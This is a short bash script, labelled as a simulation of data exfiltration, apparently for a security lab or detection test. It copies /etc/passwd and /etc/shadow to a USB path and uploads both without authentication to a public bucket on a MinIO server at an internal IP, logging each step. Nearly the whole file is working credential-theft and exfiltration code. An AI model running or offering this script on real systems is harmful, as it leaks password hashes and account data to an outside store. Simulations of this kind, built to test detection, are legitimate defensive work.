#!/bin/bash
# Simulate data exfiltration

EXFIL_FILE="/mnt/usb/exfiltrated_data.txt"
LOG_FILE="/tmp/exfiltration.log"
MINIO_ENDPOINT="http://10.10.1.131:9000"

echo "[INFO] $(date) - Starting data exfiltration" >> "$LOG_FILE"

# Copy sensitive files to USB
cp /etc/passwd "$EXFIL_FILE"
cp /etc/shadow "$EXFIL_FILE.shadow"

echo "[SUCCESS] $(date) - Data exfiltrated to USB: $EXFIL_FILE" >> "$LOG_FILE"

# Upload to MinIO
aws s3 cp "$EXFIL_FILE" s3://public --endpoint-url "$MINIO_ENDPOINT" --no-sign-request
aws s3 cp "$EXFIL_FILE.shadow" s3://public --endpoint-url "$MINIO_ENDPOINT" --no-sign-request

if [ $? -eq 0 ]; then
    echo "[SUCCESS] $(date) - Data successfully uploaded to MinIO" >> "$LOG_FILE"
else
    echo "[ERROR] $(date) - MinIO upload failed" >> "$LOG_FILE"
fi

echo "[INFO] $(date) - Exfiltration script completed" >> "$LOG_FILE"
